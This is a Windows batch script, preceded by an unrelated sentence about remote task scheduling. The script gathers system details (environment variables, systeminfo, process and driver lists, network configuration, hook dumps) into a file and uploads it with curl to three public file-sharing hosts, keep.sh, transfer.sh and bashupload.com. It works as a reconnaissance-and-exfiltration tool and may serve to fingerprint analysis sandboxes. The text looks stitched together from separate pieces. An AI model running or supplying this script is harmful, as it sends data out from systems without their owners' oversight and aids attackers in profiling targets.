A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. @echo off

echo if not exist %%1 goto end                                                             >>u.bat
echo curl.exe -k -o out_%%1_1.txt https://keep.sh --upload-file %%1                        >>u.bat
echo for /F "delims=" %%%%L in ^('                                                         >>u.bat
echo findstr https out_%%1_1.txt                                                           >>u.bat
echo '^) do set "LINE=%%%%L"                                                               >>u.bat
echo echo %%LINE%%                                                                         >>u.bat
echo start notepad.exe %%LINE%%                                                            >>u.bat
echo curl.exe -k -o out_%%1_2.txt https://transfer.sh --upload-file %%1                    >>u.bat
echo for /F "delims=" %%%%L in ^('                                                         >>u.bat
echo findstr https out_%%1_2.txt                                                           >>u.bat
echo '^) do set "LINE=%%%%L"                                                               >>u.bat
echo echo %%LINE%%                                                                         >>u.bat
echo start notepad.exe %%LINE%%                                                            >>u.bat
echo curl.exe -k -o out_%%1_3.txt https://bashupload.com --data-binary @%%1                >>u.bat
echo for /F "delims=" %%%%L in ^('                                                         >>u.bat
echo findstr https out_%%1_3.txt                                                           >>u.bat
echo '^) do set "LINE=%%%%L"                                                               >>u.bat
echo echo %%LINE%%                                                                         >>u.bat
echo start notepad.exe %%LINE%%                                                            >>u.bat
echo :end                                                                                  >>u.bat

ver >> 1.txt
set >> 1.txt
echo %DATE% >> 1.txt
echo %TIME% >> 1.txt
systeminfo.exe >> 1.txt
tasklist >> 1.txt
driverquery.exe /v >> 1.txt
ipconfig /all >> 1.txt
HookDump32.exe >> 1.txt
HookDump64.exe >> 1.txt

call u.bat 1.txt
